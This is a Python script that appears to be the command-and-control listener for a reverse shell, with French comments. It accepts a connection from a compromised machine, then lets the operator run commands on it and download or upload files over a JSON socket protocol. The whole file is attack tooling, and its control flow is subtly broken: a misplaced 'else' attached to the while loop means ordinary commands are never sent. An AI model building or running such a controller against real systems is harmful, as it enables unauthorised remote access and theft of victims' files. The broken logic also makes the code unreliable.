import socket
import json
import os
from termcolor import colored

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.bind(("127.0.0.1", 54321))
s.listen(5)

print(colored("[+] Waiting for incoming connections...", "green"))
target, ip = s.accept()

print(colored(f"[+] Connection established from: {ip}", "green"))
s.close()

def reliable_send(data):
	json_data = json.dumps(data)
	target.send(json_data.encode())

def reliable_recv():
	data = ""
	while True:
	
		try:
			data += target.recv(4096).decode()
			return json.loads(data)
	
		except ValueError:
			continue

def shell():
	while True:
		command = input("Shell#~%s: " % str(ip))

		if command == 'q':
			reliable_send('q')
			break

		elif command.startswith('download '):
			
			# Récupère un fichier de la cible
			reliable_send(command)
			result = reliable_recv()
			
			if result.startswith('[-]'):
				print(result)
			else:
				filename = os.path.basename(command[9:].strip())
				
				with open(filename, 'wb') as f:
					f.write(result.encode('latin-1'))
					
				print(f"[+] Fichier téléchargé : {filename}")

		elif command.startswith('upload '):

			# Envoie un fichier à la cible
			reliable_send(command)
			ack = reliable_recv()
			
			if ack == 'READY':
				filename = command[7:].strip()
				
				try:
					with open(filename, 'rb') as f:
						reliable_send(f.read().decode('latin-1'))
					
					print(reliable_recv())
				
				except Exception as e:
					reliable_send('ERROR')
					print(f"[-] Erreur : {e}")

	else:
		reliable_send(command)
		result = reliable_recv()
		print(result)

shell()





